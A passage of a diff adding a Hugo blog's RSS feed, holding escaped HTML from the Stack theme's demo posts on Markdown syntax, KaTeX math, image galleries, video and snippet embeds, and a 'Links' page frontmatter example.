+&lt;li>Third item&lt;/li>
+&lt;/ol>
+&lt;h3 id="unordered-list">Unordered List
+&lt;/h3>&lt;ul>
+&lt;li>List item&lt;/li>
+&lt;li>Another item&lt;/li>
+&lt;li>And another item&lt;/li>
+&lt;/ul>
+&lt;h3 id="nested-list">Nested list
+&lt;/h3>&lt;ul>
+&lt;li>Fruit
+&lt;ul>
+&lt;li>Apple&lt;/li>
+&lt;li>Orange&lt;/li>
+&lt;li>Banana&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Dairy
+&lt;ul>
+&lt;li>Milk&lt;/li>
+&lt;li>Cheese&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="other-elements--abbr-sub-sup-kbd-mark">Other Elements — abbr, sub, sup, kbd, mark
+&lt;/h2>&lt;p>&lt;abbr title="Graphics Interchange Format">GIF&lt;/abbr> is a bitmap image format.&lt;/p>
+&lt;p>H&lt;sub>2&lt;/sub>O&lt;/p>
+&lt;p>X&lt;sup>n&lt;/sup> + Y&lt;sup>n&lt;/sup> = Z&lt;sup>n&lt;/sup>&lt;/p>
+&lt;p>Press &lt;kbd>CTRL&lt;/kbd> + &lt;kbd>ALT&lt;/kbd> + &lt;kbd>Delete&lt;/kbd> to end the session.&lt;/p>
+&lt;p>Most &lt;mark>salamanders&lt;/mark> are nocturnal, and hunt for insects, worms, and other small creatures.&lt;/p>
+&lt;p>Stack has built-in support for math typesetting using &lt;a class="link" href="https://katex.org/" target="_blank" rel="noopener"
+>KaTeX&lt;/a>.&lt;/p>
+&lt;p>&lt;strong>It&amp;rsquo;s not enabled by default side-wide,&lt;/strong> but you can enable it for individual posts by adding &lt;code>math: true&lt;/code> to the front matter. Or you can enable it side-wide by adding &lt;code>math = true&lt;/code> to the &lt;code>params.article&lt;/code> section in &lt;code>config.toml&lt;/code>.&lt;/p>
+&lt;h2 id="inline-math">Inline math
+&lt;/h2>&lt;p>This is an inline mathematical expression: $\varphi = \dfrac{1+\sqrt5}{2}= 1.6180339887…$&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">$\varphi = \dfrac{1+\sqrt5}{2}= 1.6180339887…$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="block-math">Block math
+&lt;/h2>$$
+\varphi = 1+\frac{1} {1+\frac{1} {1+\frac{1} {1+\cdots} } }
+$$&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> \varphi = 1+\frac{1} {1+\frac{1} {1+\frac{1} {1+\cdots} } }
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>$$
+f(x) = \int_{-\infty}^\infty\hat f(\xi)\,e^{2 \pi i \xi x}\,d\xi
+$$&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> f(x) = \int_{-\infty}^\infty\hat f(\xi)\,e^{2 \pi i \xi x}\,d\xi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">```Stack has built-in support for math typesetting using [&lt;span class="nt">KaTeX&lt;/span>](&lt;span class="na">https://katex.org/&lt;/span>).
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="gs">**It&amp;#39;s not enabled by default side-wide,**&lt;/span> but you can enable it for individual posts by adding &lt;span class="sb">`math: true`&lt;/span> to the front matter. Or you can enable it side-wide by adding &lt;span class="sb">`math = true`&lt;/span> to the &lt;span class="sb">`params.article`&lt;/span> section in &lt;span class="sb">`config.toml`&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="gu">## Inline math
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="gu">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">This is an inline mathematical expression: $\varphi = \dfrac{1+\sqrt5}{2}= 1.6180339887…$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">```markdown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$\varphi = \dfrac{1+\sqrt5}{2}= 1.6180339887…$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="block-math-1">Block math
+&lt;/h2>$$
+\varphi = 1+\frac{1} {1+\frac{1} {1+\frac{1} {1+\cdots} } }
+$$&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> \varphi = 1+\frac{1} {1+\frac{1} {1+\frac{1} {1+\cdots} } }
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>$$
+f(x) = \int_{-\infty}^\infty\hat f(\xi)\,e^{2 \pi i \xi x}\,d\xi
+$$&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> f(x) = \int_{-\infty}^\infty\hat f(\xi)\,e^{2 \pi i \xi x}\,d\xi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Hugo theme Stack supports the creation of interactive image galleries using Markdown. It&amp;rsquo;s powered by &lt;a class="link" href="https://photoswipe.com/" target="_blank" rel="noopener"
+>PhotoSwipe&lt;/a> and its syntax was inspired by &lt;a class="link" href="https://typlog.com/" target="_blank" rel="noopener"
+>Typlog&lt;/a>.&lt;/p>
+&lt;p>To use this feature, the image must be in the same directory as the Markdown file, as it uses Hugo&amp;rsquo;s page bundle feature to read the dimensions of the image. &lt;strong>External images are not supported.&lt;/strong>&lt;/p>
+&lt;h2 id="syntax">Syntax
+&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown" data-lang="markdown">&lt;span class="line">&lt;span class="cl">![&lt;span class="nt">Image 1&lt;/span>](&lt;span class="na">1.jpg&lt;/span>) ![&lt;span class="nt">Image 2&lt;/span>](&lt;span class="na">2.jpg&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="result">Result
+&lt;/h2>&lt;p>&lt;img src="https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/1.jpg"
+width="2000"
+height="1400"
+srcset="https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/1_hu4574578169203714971.jpg 480w, https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/1_hu9042511268598201431.jpg 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="142"
+data-flex-basis="342px"
+> &lt;img src="https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/2.jpg"
+width="1500"
+height="2250"
+srcset="https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/2_hu10699635480308914167.jpg 480w, https://blog.wuko.top/posts/1970/01/01/markdown-syntax-guide.html/2_hu1741040415904021193.jpg 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="66"
+data-flex-basis="160px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>Photo by &lt;a class="link" href="https://unsplash.com/@mymind" target="_blank" rel="noopener"
+>mymind&lt;/a> and &lt;a class="link" href="https://unsplash.com/@lukechesser" target="_blank" rel="noopener"
+>Luke Chesser&lt;/a> on &lt;a class="link" href="https://unsplash.com/" target="_blank" rel="noopener"
+>Unsplash&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>For more details, check out the &lt;a class="link" href="https://stack.jimmycai.com/writing/shortcodes" target="_blank" rel="noopener"
+>documentation&lt;/a>.&lt;/p>
+&lt;h2 id="bilibili-video">Bilibili video
+&lt;/h2>
+&lt;div class="video-wrapper">
+&lt;iframe src="https://player.bilibili.com/player.html?as_wide=1&amp;amp;high_quality=1&amp;amp;page=1&amp;bvid=BV1d4411N7zD"
+scrolling="no"
+frameborder="no"
+framespacing="0"
+allowfullscreen="true"
+>
+&lt;/iframe>
+&lt;/div>
+&lt;h2 id="tencent-video">Tencent video
+&lt;/h2>
+&lt;div class="video-wrapper">
+&lt;iframe src="https://v.qq.com/txp/iframe/player.html?vid=g0014r3khdw&amp;auto=0"
+scrolling="no"
+frameborder="no"
+framespacing="0"
+allowfullscreen="true"
+>
+&lt;/iframe>
+&lt;/div>
+&lt;h2 id="youtube-video">YouTube video
+&lt;/h2>&lt;div class="video-wrapper">
+&lt;iframe loading="lazy"
+src="https://www.youtube.com/embed/0qwALOOvUik"
+allowfullscreen
+title="YouTube Video"
+>
+&lt;/iframe>
+&lt;/div>
+&lt;h2 id="generic-video-file">Generic video file
+&lt;/h2>&lt;div class="video-wrapper">
+&lt;video
+controls
+src="https://www.w3schools.com/tags/movie.mp4"
+>
+&lt;p>
+Your browser doesn't support HTML5 video. Here is a
+&lt;a href="https://www.w3schools.com/tags/movie.mp4">link to the video&lt;/a> instead.
+&lt;/p>
+&lt;/video>
+&lt;/div>
+&lt;h2 id="gist">Gist
+&lt;/h2>&lt;script src="https://gist.github.com/CaiJimmy/e2751a943de10b2a5b3a8a6c2120cb86.js">&lt;/script>
+&lt;h2 id="gitlab">GitLab
+&lt;/h2>&lt;script
+type="application/javascript"
+src="https://gitlab.com/-/snippets/2589724.js"
+>&lt;/script>
+&lt;h2 id="quote">Quote
+&lt;/h2>&lt;blockquote>
+&lt;p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/p>&lt;span class="cite">&lt;span>― &lt;/span>&lt;span>A famous person, &lt;/span>&lt;a href="https://en.wikipedia.org/wiki/Book">&lt;cite>The book they wrote&lt;/cite>&lt;/a>&lt;/span>&lt;/blockquote>
+&lt;hr>
+&lt;blockquote>
+&lt;p>Photo by &lt;a class="link" href="https://unsplash.com/@codioful" target="_blank" rel="noopener"
+>Codioful&lt;/a> on &lt;a class="link" href="https://unsplash.com/photos/WDSN62Qdxuk" target="_blank" rel="noopener"
+>Unsplash&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;div class="footnotes" role="doc-endnotes">
+&lt;hr>
+&lt;ol>
+&lt;li id="fn:1">
+&lt;p>The above quote is excerpted from Rob Pike&amp;rsquo;s &lt;a class="link" href="https://www.youtube.com/watch?v=PAAkCSZUG1c" target="_blank" rel="noopener"
+>talk&lt;/a> during Gopherfest, November 18, 2015.&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;/div></description></item><item><title>Links</title><link>https://blog.wuko.top/pages/links/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/pages/links/</guid><description>&lt;p>To use this feature, add &lt;code>links&lt;/code> section to frontmatter.&lt;/p>
+&lt;p>This page&amp;rsquo;s frontmatter:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">title&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub is the world&amp;#39;s largest software development platform.&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://github.com&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">title&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">TypeScript&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://www.typescriptlang.org&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ts-logo-128.jpg&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>image&lt;/code> field accepts both local and external images.&lt;/p></description></item><item><title>Search</title><link>https://blog.wuko.top/pages/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/pages/search/</guid><description/></item></channel></rss>
